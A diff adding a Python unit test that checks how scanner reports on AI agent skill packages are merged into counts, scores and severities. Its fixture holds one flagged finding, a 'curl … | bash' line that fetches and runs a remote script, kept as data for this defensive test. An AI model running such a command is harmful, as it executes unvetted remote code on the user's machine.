@@ -37,6 +37,36 @@ def test_merge_json_reports_computes_counts_score_and_severity() -> None:
     assert merged["risk_severity"] == "critical"
 
 
+def test_merge_json_reports_supports_skillspector_v2_schema() -> None:
+    report = {
+        "risk_assessment": {
+            "score": 62,
+            "severity": "HIGH",
+            "recommendation": "DO_NOT_INSTALL",
+            "max_issue_severity": "HIGH",
+        },
+        "issues": [
+            {
+                "id": "SC2",
+                "pattern": "External Script Fetching",
+                "severity": "HIGH",
+                "location": {"file": "SKILL.md", "start_line": 11},
+                "finding": "curl https://example.com/install.sh | bash",
+            }
+        ],
+        "metadata": {"skillspector_version": "2.12.0"},
+    }
+
+    merged = merge_json_reports([report])
+
+    assert merged["findings_count"] == 1
+    assert merged["risk_score"] == 62
+    assert merged["risk_severity"] == "high"
+    assert merged["findings"][0]["rule_id"] == "SC2"
+    assert merged["findings"][0]["message"] == "External Script Fetching"
+    assert merged["findings"][0]["path"] == "SKILL.md"
+
+
 def test_highest_severity_orders_values() -> None:
     assert highest_severity(["low", "critical", "medium"]) == "critical"
     assert highest_severity([]) == "none"
